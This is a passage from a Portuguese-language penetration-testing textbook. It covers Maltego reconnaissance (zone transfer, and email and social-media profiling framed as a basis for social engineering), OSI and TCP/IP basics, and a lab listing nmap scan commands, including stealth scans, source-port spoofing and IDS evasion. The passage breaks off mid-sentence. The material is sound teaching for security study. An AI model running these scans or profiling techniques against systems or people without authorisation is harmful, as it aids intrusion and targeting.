h\tand\tlet\tme\tplay\taround\n),\nabrir\tum\tgráfico\tde\texemplo\t(opção\t\nOpen\tan\texample\tgraph\n)\tou\tpular\tessa\tetapa\n(opção\t\nGo\taway,\tI\thave\tdone\tthis\tbefore\n).\tApenas\tpara\tilustrar\tvou\tselecionar\taopção\t\nRun\ta\tmachine\n,\tpara\tmostrar\t(apenas\tvisualmente)\tquais\tsão\tos\ttipos\tde\ntransformação\tque\to\tMaltego\tpode\trealizar\t(Figura\t6.5).\nFigura\t6.5\t–\tSelecione\ta\topção\tRun\ta\tmachine\t(NEW!!)\nAgora\ttemos\ta\topção\tde\tescolher\tum\ttemplate\tpronto\tpara\tser\tusado\tna\ntransformação\tdo\tMaltego.\tCada\ttemplate\ttem\tum\tmecanismo\tde\tbusca\te\nvarredura\tsobre\ta\trede\tem\tque\tse\tqueira\trealizar\to\tteste.\tUma\tvez\tentendido\to\nfuncionamento\tdo\tMaltego,\teu\tdesafio\to\tleitor\ta\tmexer\te\tbrincar\tcom\to\tMaltego\ncom\tos\ttemplates\tpredefinidos\te\tver\to\tresultado\tde\tcada\tum.\nPrimeiro\tvou\tcancelar\tesses\ttemplates\te\tcriar\tuma\tvarredura\ta\tpartir\tdo\tinício,\nconforme\tmostra\ta\tfigura\t6.6.\nFigura\t6.6\t–\tTemplates\tprontos\tpara\to\tMaltego.\nCrie\tum\ttemplate\tnovo\tconforme\tmostra\ta\tfigura\t6.7.Figura\t6.7\t–\tTemplate\tnovo.\nO\tMaltego\té\tdividido\tem\tabas\t(Figura\t6.8).\tNa\taba\tda\tesquerda\tpodemos\nescolher\to\ttipo\tde\tteste\tque\tserá\trealizado:\tenumeração\tDNS,\tcoleta\tde\temail,\ninformações\tde\tredes\tsociais\tetc.\tA\taba\tcentral\té\tuma\tinterface\tgráfica\tpara\nmanipulação\tdos\ttestes\tselecionados\tna\taba\tda\tesquerda.\tNa\taba\tda\tdireita\npodemos\tescolher\tas\tinformações\te\tdetalhes\tdo\tprocessamento\te\trealizações\tde\ntestes).\tNa\taba\tinferior\té\tmostrado\to\tresultado\tdo\tteste.\nFigura\t6.8\t–\tAbas\tdo\tMaltego.\tCada\taba\ttem\ta\tsua\tfuncionalidade.\nPara\trealizarmos\tum\tteste\tsobre\tum\tdomínio,\tclicamos\tsobre\to\titem\t\nDomain\n\tda\naba\tda\tesquerda\te\tarrastamos\to\titem\tpara\ta\taba\tcentral.\tA\tfigura\t6.9\tmostra\tesse\nprocedimento.Figura\t6.9\t–\tCriação\tdo\tprimeiro\tteste.\nPor\tpadrão\té\tselecionado\to\tdomínio\t\npaterva.com\n\t(domínio\tdos\tcriadores\tdo\nMaltego).\tPodemos\talterar\tesse\tdomínio\tclicando\tsobre\to\tseu\tícone\tna\taba\ncentral\te\tapertando\ta\ttecla\t\nF2\n\t(como\tse\tfôssemos\trenomear\to\tarquivo)\tou,\tna\taba\nà\tdireita\tno\tcampo\t\nDomain\tName\n,\tpodemos\tdefinir\to\tnovo\tdomínio.\tA\tfigura\n6.10\tmostra\tesse\tprocedimento.\nFigura\t6.10\t–\tTrocando\tpara\to\tdomínio\tdesejado.\nHá\tdiversos\ttestes\tque\to\tMaltego\tpode\trealizar.\tPara\tver\tas\ttransformações\npossíveis,\tclique\tcom\to\tbotão\tdireito\tdo\tmouse\tsobre\to\tícone\tlocalizado\tna\taba\ncentral\te\tvá\tpara\ta\tguia\t\nRun\tTransform\n.\tA\tguia\t\nRun\tMachine\n\tcontém\tos\ntemplates\tprontos\tmostrados\tna\tinicialização\tdo\tMaltego\tpara\taquele\tcenário\t(no\nnosso\texemplo,\to\tdomínio\t\nkali.com.br\n).\tA\tfigura\t6.11\tmostra\tesse\tprocedimento.Figura\t6.11\t–\tPossíveis\ttestes\ta\tserem\trealizados.\nVá\tà\tguia\t\nRun\tTransform>\tOthers\tTransforms\t>\tDomainTODNSZoneTransfer\npara\trealizar\tuma\ttransferência\tde\tzona.\tDependendo\tda\ttransformação\tusada,\té\nexibida\tuma\tmensagem\tde\talerta\t(Figura\t6.12).\nFigura\t6.12\t–\tMensagem\tde\talerta.\tAceite-a\tsem\tproblemas.\nA\tfigura\t6.13\tmostra\to\tresultado\tda\ttentativa\tde\ttransferência\tde\tzona.\nFigura\t6.13\t–\tTransferência\tde\tzona\texecutada\tcom\tsucesso.\tO\tdomínio\nkali.com.br\ttem\toito\tservidores.O\tresultado\tobtido\tpode\tsofrer\toutra\ttransformação.\tPor\texemplo,\ta\tfigura\t6.13\nmostra\tque\to\tdomínio\tcontém\to\tservidor\tFTP\tftp.kali.com.br.\tPor\tmeio\tdesse\nservidor\té\tpossível\tfazer\tuma\tanálise\t(transformação),\te\tcom\to\tresultado\tobtido\nfazer\toutras\tanálises\t(transformações).\tAs\tpossibilidades\tsão\tinfinitas.\nA\tfigura\t6.14\tmostra\to\tresultado\tdessa\ttransformação.\nFigura\t6.14\t–\tResultado\tde\tuma\ttransformação\t“Resolve\tto\tIP”\tsobre\to\tativo\nftp.kali.com.br.\nUma\ttransformação\tque\tvale\ta\tpena\tser\tcitada\té\ta\ttransformação\tsobre\temail,\nque\tfaz\tuma\tanálise\tdos\tsites\tque\ttenham\taquele\temail\tcomo\tregistro.\tUma\tboa\nfonte\tde\tengenharia\tsocial,\tpois\tpodemos\t“lapidar”\tqual\té\to\tgosto\tda\tpessoa\te\nselecionar\tum\tvetor\tde\tataque\tcom\tbase\tnessas\tinformações.\tA\tfigura\t6.15\nmostra\tessa\ttransformação.\nFigura\t6.15\t–\tTransformação\tsobre\temail.\nComo\túltimo\tteste\ttambém\té\tpossível\tobter\tdados\tdas\tpessoas\tpor\tmeio\tde\tredes\nsociais,\tconforme\tmostra\ta\tfigura\t6.16.Figura\t6.16\t–\tTransformação\tsobre\tredes\tsociais.CAPÍTULO\n\t7\nEnumeração\nCom\ta\tlista\tde\thosts\tonline,\to\tprocesso\tde\tpentest\tdeve\tser\t“afunilado”\tpor\tmeio\nda\tetapa\tde\tenumeração,\tque\tconsiste\tem\trealizar\tum\tlevantamento\tmais\nespecífico\tsobre\tdeterminada\tmáquina.\tPor\texemplo,\tdeterminamos\tque\ta\nmáquina\tXYZ\testeja\tonline\te\trespondendo\tpor\tpacotes\tna\trede.\tMas\tesse\ttipo\tde\ninformação\té\tmuito\tsupérflua.\tIsso\tporque\tuma\tmáquina\trespondendo\tpor\npacotes\tnão\tnecessariamente\té\tuma\tmáquina\tvulnerável.\tPara\tcomeçar\ta\tcavar\nmais\tfundo\tdevemos\tdeterminar:\n•\tPortas\tabertas\tjuntamente\tcom\ta\tversão\tdo\tserviço\trodando.\n•\tSistema\toperacional.\nSe\tuma\tmáquina\ttem\tuma\tporta\taberta,\tobrigatoriamente\testará\trodando\tum\nserviço,\tmas\to\tfato\tde\testar\trodando\tum\tserviço\tnão\tindica\tvulnerabilidade.\nPorém,\ta\tmáquina\tpode\testar\trodando\talgum\tserviço\tvulnerável.\nEntão,\tconstatada\ta\tporta\taberta\te\ta\tversão\tdo\tserviço\tque\testá\tescutando\tnessa\nporta,\ta\tbusca\tpor\texploits\tcontra\taquele\tsoftware\té\trealizada\tcom\to\tintuito\tde\nencontrar\talguma\tfalha\tque\tpossibilite\ta\tinvasão\tdo\tsistema.\nAntes\tde\tenumerarmos\tas\tportas\tabertas\te\tdescobrir\ta\tversão\tdo\tsistema\noperacional\té\tnecessário\tcompreendermos\to\tmodelo\tOSI\tcom\to\tprotocolo\tTCP\n(serão\tmanipuladas\tas\tflags\tdo\tprotocolo\tTCP,\te\tum\tentendimento\tbásico\tsobre\nesses\tconceitos\té\tfundamental\tpara\tprosseguirmos\tnos\testudos).\n7.1\tModelo\tOSI\nO\tmodelo\tOSI\té\tum\tmodelo\tconceitual\tque\tdivide\tem\tsete\tcamadas\tos\nprotocolos\tpara\tredes\tde\tcomputadores.\tÉ\tapenas\tum\tmodelo\tde\treferência,\tque\nserve\tpara\tconstrução\tde\toutros\tprotocolos,\tporém\tnão\té\timplementado\nfisicamente.\nO\tmodelo\tOSI\tdivide\to\tencapsulamento\te\ttransmissão\tdos\tdados\tem\tsete\ncamadas:\nTabela\t7.1\t–\tCamadas\te\tfuncionalidadesTabela\t7.1\t–\tCamadas\te\tfuncionalidades\nCamada\nNome\nDescrição\n7\nAplicação\nÚltima\tcamada\tdo\tmodelo\tOSI,\tonde\tficam\tos\tserviços\tque\tinteragem\tdiretamente\tcom\to\tusuário.\nPor\texemplo:\tserviços\tweb\t(protocolo\tHTTP),\temail\t(protocolo\tSMTP).\n6\nApresentação\nÉ\tresponsável\tpor\torganizar\t(sintaticamente/semanticamente)\tos\tdados\te\ttransmiti-los\tà\tcamada\nde\taplicação.\tA\tcriptografia\te\ta\tcompressão\tde\tdados\tfazem\tparte\tdessa\tcamada.\n5\nSessão\nÉ\ta\tcamada\tresponsável\tpor\tmanter\tativas\tas\tconexões\tentre\tos\tsockets\t(processos)\tde\tduas\nmáquinas\tdistintas\tque\testão\tse\tcomunicando\tna\trede\tvia\tcamada\tde\ttransporte.\n4\nTransporte\nA\tcamada\tde\ttransporte\tpossibilita\tque\tdois\thosts\tremotos\tpossam\ttrocar\tdados.\tOs\tprotocolos\nTCP\t(Transmission\tControl\tProtocol)\te\tUDP\t(User\tDatagram\tProtocol)\tenquadram-se\tnessa\ncamada.\n3\nRede\nOs\tpacotes\tencapsulados\taté\ta\tcamada\t4\tprecisam\ttrafegar\tentre\tmáquinas\tdistintas.\tO\tsistema\tde\ntráfego\tde\tdados\té\tdenominado\troteamento.\tImaginem\to\troteamento\tcomo\tsendo\tvárias\tvias\tde\numa\testrada.\tO\tcarro\t(pacote)\tpode\tescolher\tvários\tcaminhos\t(rotas)\tpara\tchegar\tao\tdestino,\nporém\to\tmais\tsensato\té\tsempre\tescolher\to\tmelhor\tcaminho\t(o\tmenos\tcongestionado,\tcom\ta\nmelhor\testrada\tetc.).\tA\tfunção\tda\tcamada\tde\trede\té\tajustar\to\tenvio\tdo\tpacote\tpara\tque\teste\ntrafegue\tna\tmelhor\trota\tou\tcaminho.\n2\nEnlace\nA\tcamada\tde\tenlace\ttem\tcomo\tfunção\ta\tdetecção\te\tcorreção\tde\terros\tque\tpodem\tser\tencontrados.\nA\tsubcamada\tMAC\tpertence\ta\tessa\tcamada.\n1\nFísica\nCamada\tfísica\tpropriamente\tdita.\tPor\texemplo:\tcabos,\thardware\tetc.\nDurante\ta\ttransmissão\tde\tdados,\tcada\tcamada\tcomunica-se\tcom\to\tseu\nequivalente\tentre\treceptor\te\ttransmissor.\tPor\texemplo,\ta\tcamada\t1\tdo\ntransmissor\tcomunica-se\tcom\ta\tcamada\t1\tdo\treceptor,\ta\tcamada\t5\tdo\ntransmissor\tcomunica-se\tcom\ta\tcamada\t5\tdo\treceptor.\tPara\tque\tessa\ncomunicação\tentre\tcamadas\tseja\tpossível,\tcada\tdado\té\tencapsulado\tdentro\tda\ncamada\tinferior\t(por\texemplo,\ta\tcamada\t7\té\tencapsulada\tdentro\tda\tcamada\t6\te\nassim\tsucessivamente),\te\tchegando\tà\tcamada\tfísica,\tos\tdados\tsão\trepassados\taté\no\tdestino.\tO\tdestino\tfará\to\tprocesso\tinverso,\tdesencapsulando\ta\tcamada\tfísica\naté\tchegar\tà\tcamada\t7.\tNo\tmomento\tem\tque\tchegar\tà\tcamada\t7,\to\tusuário\tfinal\npoderá\tler\tos\tdados\tque\tforam\ttransmitidos.\n7.2\tProtocolo\tTCP/IP\nO\tprotocolo\tTCP\té\to\tprincipal\tprotocolo\tbaseado\tno\tmodelo\tOSI,\te\tque\tfoi\nimplementado\tna\tprática.\tO\tprotocolo\tTCP\tapresenta\tas\tprincipais\tcaracterísticas\nrelacionadas\tà\ttransferência\tde\tdados\tde\tforma\tconfiável\t–\tuma\tconexão\nconfiável\té\tuma\tconexão\tque\tassegura\tque\to\tdestino\treceberá\tos\tdados\tque\tsão\nenviados\tpela\torigem.\tÉ\tgraças\tao\tTCP\tque\tas\tconexões\tda\tinternet\tsão\npossíveis.\nA\toperação\tde\ttransferência\tde\tdados\tdo\tTCP\tacontece\tgraças\ta\tum\tmecanismo\ndenominado\t3-way\thandshake.\tEsse\tmecanismo\t(chamado\tde\taperto\tde\tmão)\tfazcom\tque\thaja\ttroca\tde\tmensagens\tantes\tde\tos\tdados\tserem\ttransmitidos.\tE\té\ngraças\ta\tesse\tmecanismo\tque\tos\tdados\tsão\ttransmitidos\tda\torigem\taté\to\tdestino\nde\tforma\tsegura.\nFuncionamento:\n1\n.\tA\torigem\t(cliente)\tenvia\tum\tpacote\tcom\ta\tflag\tSYN\tativa.\n2\n.\tO\tdestino\t(servidor)\tresponde\tcom\tum\tpacote\tcom\tas\tflags\tSYN\t+\tACK.\n3\n.\tA\torigem\t(cliente)\tresponde\tcom\tum\tpacote\tcom\ta\tflag\tACK.\nPara\tfinalizar\tuma\tconexão,\ta\torigem\tenvia\tum\tpacote\tcom\ta\tflag\tFIN\n(indicando\ttérmino\tda\tconexão)\te\to\tdestino\tenvia\tum\tpacote\tcom\ta\tflag\tACK\n(indicando\tque\tentendeu\to\tpacote\tFIN).\nLogo\tapós\tum\ttempo,\to\tdestino\tenvia\tum\tpacote\tFIN\te\ta\torigem\tenvia\tum\tACK.\nO\tprocesso\tde\t3-way\thandshake\té\tmostrado\tna\tfigura\t7.1.\nFigura\t7.1\t–\tRepresentação\tvisual\tdo\t3-way\thandshake.\nO\tTCP\ttem\tas\tseguintes\tcaracterísticas:\n•\t\nConexão\torientada\n\t–\tOs\tdados\tnão\tsão\tenviados\tao\tacaso.\tÉ\tnecessário\nestabelecer\tuma\tvia\tsegura\tpara\ttroca\tde\tdados\t(3-way\thandshake).\n•\t\nConfiável\n\t–\tÉ\tum\tprotocolo\torientado\tà\tconexão\t(os\tdados\tchegarão\tao\ndestino).\tCaso\tum\tdado\tse\tperca\tou,\tainda,\tchegue\tfora\tde\tordem,\to\tpróprio\nTCP\ttem\tmecanismos\tde\tajustes\tque\tfazem\tcom\tque\to\tpacote\tperdido\tou\ndesorganizado\tseja\tretransmitido\te\treorganizado.\n•\t\nMúltiplos\tcanais\tde\ttransmissão\n\t–\tO\tTCP\tutiliza-se\tde\tmeios,\tcomo\to\nfullduplex,\tque\tpermitem\ttransmitir\tdados\tem\tparalelo.\tEntão,\tenquanto\ta\nextremidade\tA\trecebe\tdados,\tao\tmesmo\ttempo\tpode\tenviar\tdados\tpara\ta\nextremidade\tB\t(vice-versa).•\t\nControle\tde\tfluxo\n\t–\tO\tTCP\ttem\tmecanismos\tque\tcontrolam\to\tfluxo\tde\ndados.\nDiferentemente\tdo\tmodelo\tOSI,\to\tprotocolo\tTCP\ttem\tapenas\tquatro\tcamadas:\n•\t\nRede\n\t–\tDefine\tcomo\tos\tdados\tdevem\tser\ttransmitidos.\tPor\texemplo:\tse\ta\nrede\té\tsem\tfio\t(transmissão\tvia\tradiofrequência),\ta\tcamada\tde\trede\tfornece\nrecursos\tpara\tque\tos\tdados\tsejam\tadequadamente\ttransmitidos\tpor\tesse\tmeio.\n•\t\nInternet\n\t–\tResponsável\tpelo\troteamento.\tOs\tprotocolos\tARP\te\tICMP\tfazem\nparte\tdessa\tcamada.\n•\t\nTransporte\n\t–\tResponsável\tpor\trepassar\tos\tdados\tpara\ta\tcamada\tde\taplicação.\nOs\tprotocolos\tTCP\te\tUDP\tenquadram-se\tnessa\tcamada.\n•\t\nAplicação\n\t–\tCamada\tmais\talta\tdo\tTCP.\tPossibilita\tque\tos\tusuários\tinterajam\ncom\taplicativos\tde\tinternet.\tNavegador\tweb,\tcliente\tFTP,\tservidores\tde\temail\n(SMTP)\tsão\texemplos\tde\taplicativos\tque\tatuam\tna\tcamada\t7.\nA\tfigura\t7.2\trepresenta\tuma\tanalogia\tentre\to\tmodelo\tOSI\te\to\tmodelo\tTCP.\nFigura\t7.2\t–\tModelo\tOSI\te\tmodelo\tTCP.\tFonte:\nhttp://1.bp.blogspot.com/-7Gjs30JGt1w/Tk6zQzBnpII/AAAAAAAAAAY/W6VtClPxm_g/s640/377.png.\nO\tprotocolo\tTCP\té\tcomposto\tdos\tseguintes\tcampos,\tconforme\tmostra\ta\tfigura\n7.3.\nFigura\t7.3\t–\tCampos\tdo\tTCP.\tFonte:\thttp://www.insecure.in/images/TCP-\nHeader.png.Header.png.\n•\t\nSource\tPort\n\t–\tPorta\tpor\tonde\tos\tdados\tserão\tenviados.\n•\t\nDestination\tPort\n\t–\tPorta\tpor\tonde\tos\tdados\tserão\trecebidos.\n•\t\nSequence\tNumber\n\t–\tNúmero\tde\tsequência\tque\tpermite\tao\tprotocolo\tTCP\ntransmitir\to\tpacote\tde\tforma\tsegura\t(o\tpacote\té\treenviado\tcaso\tseja\tperdido)\ne\tordenado\t(o\tpacote\té\tremontado\tcaso\tseja\tenviado\tfora\tde\tordem).\n•\t\nAcknowledgment\tNumber\n\t–\tNúmero\tdo\treconhecedor,\tusado\tpara\tindicar\nque\to\tpacote\tanterior\tfoi\trecebido\tcom\tsucesso.\n•\t\nOffset\n\t–\tTamanho\tdo\tcabeçalho\tTCP.\n•\t\nReserved\n\t–\tAinda\tnão\tutilizado.\tÉ\treservado\tpara\tuso\tfuturo.\n•\t\nFlags\n\t–\tFlags\tde\tcontrole.\tPode\tser\tum\tdos\tseguintes\ttipos:\n•\t\nCWR\n\t–\t\nCongestion\tWindow\tReduced\n.\tUsado\tpelo\ttransmissor\tindicando\nque\trecebeu\to\tECE,\tpara\treduzir\ta\tquantidade\tde\tpacotes\tenviados.\n•\t\nECE/ECN-Echo\n\t–\t\nExpliced\tCongestion\tNotification\tEcho\n.\tEnviado\tpelo\nreceptor\tcom\ta\tflag\tACK,\tindicando\tcongestionamento\tna\trede.\n•\t\nURG\t\n–\tO\tpacote\té\turgente.\n•\t\nACK\n\t–\tIndica\tque\to\tpacote\tanterior\tfoi\trecebido\tcom\tsucesso.\n•\t\nPSH\n\t–\tOs\tdados\trecebidos\taté\to\tmomento\tdevem\tser\tenviados\tpara\ta\naplicação\timediatamente.\n•\t\nRST\n\t–\tInterrompe\tforçadamente\ta\tconexão.\n•\t\nSYN\n\t–\tSincroniza\to\tnúmero\tde\tsequência\tpara\testabelecer\tconexão\tno\ninício\tda\tsessão.\n•\t\nFIN\n\t–\tUsado\tpara\tfinalizar\tuma\tconexão\tde\tmaneira\tadequada,\tinformando\nque\to\ttransmissor\tnão\tcontém\tmais\tdados\ta\tserem\tenviados.\n•\t\nWindow\n–\tEspecifica\to\ttamanho\tdo\tbuffer\tdo\treceptor.\n•\t\nChecksum\n\t–\tVerifica\ta\tintegridade\tdo\tpacote\tTCP.\tUsado\tpara\tchecagem\tde\nerros.\n•\t\nUrgent\tPointer\n\t–\tIndica\to\tponto\tde\turgência,\tou\tseja,\ta\tpartir\tde\tqual\nendereço\ta\tinformação\té\turgente.\n•\t\nTCP\tOptions\n\t–\tOpções\tdiversas.\tPor\texemplo,\to\tPadding\tque\tpreenche\to\nTCP\tOptions\n\tcom\tzeros\tpara\tque\tesse\tcampo\tfique\tcom\tum\ttamanho\tde\t32\nbits.Já\to\tprotocolo\tUDP\té\tapenas\tum\tprotocolo\tde\tenvio\tde\tdados,\tnão\tse\npreocupando\tse\tos\tdados\tchegaram\tou\tnão\t(enviar\tum\tpacote\te\tnão\tesperar\nresposta\té\tútil\tem\tdeterminadas\tsituações,\tcomo\tem\tVoIP\n1\n).\tDevido\ta\tessa\nsimplicidade\tem\tcomparação\tao\tTCP,\to\tprotocolo\tUDP\tnão\ttem\ttantas\tflags\tde\ncontrole.\nO\tpacote\tUDP\tcontém\tos\tseguintes\tcampos,\tconforme\tmostra\ta\tfigura\t7.4.\nFigura\t7.4\t–\tCampos\tdo\tUDP\nFonte:\thttp://www.insecure.in/images/UDP-Header.png.\nOs\tcampos\tdo\tUDP\tsão\tanálogos\taos\tcampos\tdo\tTCP.\n7.3\tPort\tscanner\nA\ttécnica\tde\tscanning\tou\tvarredura\tde\tportas\t(port\tscan)\té\tuma\tdas\ttécnicas\tmais\ncomuns\te\tusadas\tpor\tatacantes\tpara\tdescobrir\tserviços\tvulneráveis\tem\tum\nsistema.\tCom\ta\tvarredura\tde\tportas\té\tpossível\tdeterminar\tse\tuma\tporta\testá\nsendo\tou\tnão\tusada\te,\tcaso\testeja,\tteste-a\tcom\to\tintuito\tde\tencontrar\tpossíveis\nvulnerabilidades.\nExistem\ttrês\ttipos\tde\tscanning:\n•\t\nScanning\tde\trede\n\t–\tsão\tidentificados\tapenas\tos\thosts\tativos.\tExemplo\tde\nscanner:\tping.\n•\t\nScanning\tde\tporta\n\t–\t\nsão\tverificadas\tas\tportas\tabertas\te\tserviços\tativos.\nExemplo\tde\tscanner:\tNmap.\n•\t\nScanning\tde\tvulnerabilidades\n–\tsão\tdetectadas\tas\tvulnerabilidades\texistentes\nno\tsistema.\tExemplo\tde\tscanner:\tOpenVAS.\nA\tresposta\tdo\tport\tscanner\tvaria\tcom\to\ttipo\tde\tconexão\t(TCP\tou\tUDP).\tEm\nconexões\tTCP,\tpara\tse\tdescobrir\tuma\tporta\taberta,\to\tport\tscanner\tenvia\tuma\tflag\nSYN\tpara\ta\tporta.\tCaso\ttenha\tcomo\tresposta\tas\tflags\tSYN+ACK,\ta\tporta\testá\naberta.\tCaso\treceba\tas\tflags\tRST+ACK,\ta\tporta\testá\tfechada.Se\to\tport\tscanner\treceber\ta\tmensagem\tICMP\tPORT\tUNRECHEBLE,\ta\tporta\nestá\tfiltrada\tpela\tregra\tREJECT\tno\tiptables.\nSe\to\tport\tscanner\tnão\treceber\tresposta\tnenhuma,\tindica\tuma\tporta\tfiltrada\tpela\nregra\tDROP\tno\tiptables.\nJá\tem\tconexões\tUDP,\tcomo\to\tUDP\tnão\té\tum\tprotocolo\torientado\ta\tconexões\t–\to\nUDP\tsimplesmente\tenvia\to\tpacote,\tpouco\timporta\tse\to\tdestino\trecebeu\to\tpacote\nou\tnão\t–,\to\tresultado\té\tum\tpouco\tdiferente\tdo\tTCP.\tNo\tUDP,\tpara\tse\tdescobrir\numa\tporta\taberta,\to\tport\tscanner\tenvia\tuma\tflag\tSYN\tpara\ta\tporta,\tcaso\ttenha\ncomo\tresposta\tICMP\tPORT\tUNRECHEBLE,\tindica\tque\ta\tporta\testá\tfechada\tou\nestá\tsendo\taplicada\tuma\tregra\tde\tREJECT.\tAinda\tse\ttratando\tdo\tprotocolo\tUDP,\ncaso\to\tport\tscanner\tnão\treceba\tresposta,\tindica\tque\ta\tporta\testá\taberta\tou\tsendo\nfiltrada\tpela\tregra\tDROP\tno\tiptables.\n7.3.1\tNmap\nNmap\té\tum\tport\tscanner\tcom\tmuitas\tqualidades,\tcriado\tpelo\thacker\tFyodor\tem\n1997.\tSuas\tprincipais\thabilidades\tincluem:\tdescoberta\tde\talvos\tonline,\tdetecção\nde\tserviços\te\tsuas\trespectivas\tversões,\tdetecção\tdo\tsistema\toperacional,\ndeterminação\tde\trota\tetc.\n7.3.1.1\tLaboratório\tcom\tNmap\nRealize\tas\tseguintes\tconfigurações\tno\tDebian:\nroot@debian#\n\tservice\tapache2\tstart\nroot@debian#\n\tservice\tbind9\tstart\nroot@debian#\n\tservice\tssh\tstart\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t22\t–j\tDROP\t!\t--sport\t666\nroot@debian#\n\tiptables\t–A\tINPUT\t–p\ttcp\t--dport\t80\t–j\tREJECT\nPor\tmeio\tde\texemplos\tpráticos,\tvamos\tver\tcomo\tfunciona\tas\tprincipais\topções\te\nvarreduras\tdo\tNmap:\n1\n.\t\nVarredura\tsimples\nroot@kali#\n\tnmap\t192.168.1.102\n2\n.\t\nVarredura\tde\tuma\trede\tinteira\n.\tO\t\n0/24\n\tindica\tque\tserão\tescaneados\ttodos\nos\thosts\tda\trede\nroot@kali#\n\tnmap\t\n192.168.1.0/24\n3\n.\t\nVarredura\t3-way\thandshake\tcompletaroot@kali#\n\tnmap\t192.168.1.102\t\n–sT\n4\n.\t\nVarredura\tSYN\n.\tDiferentemente\tda\tvarredura\t3-way\thandshake\tcompleta,\nna\tvarredura\tSYN,\to\t\n3-way\thandshake\t\nnão\té\tcompleto.\tNa\túltima\tetapa\tdo\naperto\tde\tmão\té\tenviada\tuma\tflag\tRST\tfinalizando\ta\tconexão,\tsendo\tuma\nvarredura\tmais\tsutil\tdo\tque\ta\tvarredura\t3-way\thandshake\tcompleta.\nA\tfigura\t7.5\tmostra\ta\tdiferença\tentre\tas\tduas\tvarreduras.\nFigura\t7.5\t–\tDiferença\tentre\tas\tduas\tvarreduras.\nroot@kali#\n\tnmap\t192.168.1.102\t\n–sS\n5\n.\t\nVarredura\tSYN\tem\tuma\tporta\tespecífica\nroot@kali#\n\tnmap\t192.168.1.102\t\n–sS\t–p\t80\n6.\n\t\nVarredura\tSYN\tem\tuma\tporta\tespecífica\t(redes\tinteiras)\n.\tQuando\nrealizamos\ta\tvarredura\tde\tum\tgrande\tnúmero\tde\thosts,\tuma\tboa\tmedida\té\nfiltrarmos\to\tresultado\tmostrando\tcom\ta\topção\t\n--open\t\npara\tdeterminar\tquais\nsão\tos\thosts\tque\tpossuem\tdeterminada\tporta\taberta.\tPor\texemplo,\tse\to\tleitor\nquiser\tdeterminar\tapenas\tos\thosts\tque\tpossuem\ta\tporta\t80\taberta\tna\trede,\ndigite\nroot@kali#\n\tnmap\t192.168.1.0/24\t\n–sS\t–p\t80\t--open\nAs\tvarreduras\tFIN,\tXMAS,\tNULL,\tWindow\te\tACK\tsão\tutilizadas\tpara\ndeterminação\tde\tregras\tde\tfirewall,\te\tnão\tdetectam\tas\tportas\tabertas,\tsomente\tse\numa\tporta\testá\tsendo\tfiltrada\tpor\tum\tfirewall.\n7\n.\t\nVarredura\tFIN\nroot@kali#\n\tnmap\t192.168.1.102\t\n–sF\n8\n.\t\nVarredura\tXMAS\t(FIN+PSH+URG)\n.\tFaz\tcom\tque\to\tpacote\tfique\nparecendo\tuma\tárvore\tde\tNatal:\ttodas\tas\tflags\tligadas.\nroot@kali#\n\tnmap\t192.168.1.102\t\n–sX\n9\n.\t\nVarredura\tTCP\tNULL\n.\tDesabilita\tas\tflags\tdo\tpacote.\nroot@kali#\n\tnmap\t192.168.1.102\t\n–sN\n10\n.\t\nVarredura\tWindowroot@kali#\n\tnmap\t192.168.1.102\t\n–sW\n11\n.\t\nVarredura\tACK\nroot@kali#\n\tnmap\t192.168.1.102\t\n-sA\n12\n.\t\nVarredura\tUDP\tem\tuma\tporta\tespecífica\nroot@kali#\n\tnmap\t192.168.1.102\t\n–sU\t–p\t53\n13\n.\t\nVarredura\tcom\tporta\tde\torigem\nroot@kali#\n\tnmap\t192.168.1.102\t–sS\t–p\t22,80\nroot@kali#\n\tnmap\t192.168.1.102\t–sS\t–p\t22,80\t\n–g\t666\n14\n.\t\nPing\n.Teoricamente\trealizar\tuma\tvarredura\tping\tutiliza\tapenas\ta\topção\t\n-sn\n,\nporém\tquando\tse\tfaz\tuma\tvarredura\tna\tnossa\tprópria\trede,\tmesmo\nescolhendo\ta\topção\t\n-sn\t\n(substituiu\ta\tantiga\topção\t\n-sP\n),\to\tnmap\tutiliza-se\tde\noutras\tvarreduras\t(como\to\tenvio\tde\tARP\tRequest,\tum\tpacote\tICMP\nTIMESTAMP\te\ttambém\tenvia\tpacotes\tpara\tas\tportas\t80\te\t443).\tDessa\nforma,\té\tsempre\tbom\trefinar\ta\tnossa\tvarredura\tpara\tque\tseja\tsomente\nenviado\to\tpacote\tICMP\tEcho\tRequest.\tPara\tisso,\tvamos\tusar\tas\topções\t\n-PE\n(especifica\tclaramente\tque\to\tpacote\tdeve\tser\tdo\ttipo\tICMP\tEcho\tRequest)\te\t\n-\n-send-ip\n\t(envia\tpacotes\tIP\tcrus,\tignorando\trequisições\tde\tARP\tRequest).\nroot@kali#\n\tnmap\t192.168.1.1\t\n–sn\t-PE\t--send-ip\n15\n.\t\nPing\tsweep\n.\tEssa\ttécnica\tconsiste\tem\tenviar\tpacotes\tICMP\tEcho\tRequest\npara\ttodos\tos\thosts\tda\trede\ta\tfim\tde\tdeterminar\tquais\tdeles\testão\tativos\te\nrespondendo\tcom\tICMP\tEcho\tReply.\nroot@kali#\t\nnmap\t192.168.1.0/24\t\n–sn\n16\n.\t\nVarredura\tsem\tping\n.\tAssume-se\tque\ta\tmáquina\testeja\tonline.\nroot@kali#\t\nnmap\t192.168.1.102\t\n-PN\n17\n.\t\nVarredura\tcom\tTraceroute\nroot@kali#\t\nnmap\t192.168.1.102\t\n--traceroute\n18\n.\t\nDefinindo\to\tnível\tde\tagressividade\t(0-5)\n.\tPor\tmeio\tda\topção\t\n-T\n\té\tdefinido\no\tnível\tde\tagressividade\tdo\tNmap,\tpodendo\tvariar\tde\t0\taté\t5\t(0\tindica\tpouco\nnível\tde\tagressividade,\te\t5\tindica\tuma\tvarredura\taltamente\tagressiva).\nEntenda\tuma\tvarredura\tagressiva\tcomo\tsendo\tuma\tvarredura\tque\tpouco\tse\nimporta\tcom\tsistemas\tde\tdefesa,\tcomo\tfirewalls\te\tsistema\tde\tdetecção\tde\nintruso\t(IDS).\tVarreduras\tagressivas\tsão\textremamente\trápidas,\tmas\tnãotomam\tnenhum\tcuidado\te\tfazem\tmuito\t“barulho”\tna\trede.\tVarreduras\tpouco\nagressivas\tàs\tvezes\tsão\textremamente\tlentas,\tmas\tem\tcompensação\tpodem\nser\tusadas\t(em\tconjunto\tcom\toutras\tregras\tdo\tNmap)\tpara\ttentar\tvoar\tmais\nbaixo\tno\tradar\tde\tIDS\te\tfirewalls.\nroot@kali#\n\tnmap\t192.168.1.102\t\n–T\t4\n19\n.\t\nVarredura\tem\tmodo\tagressi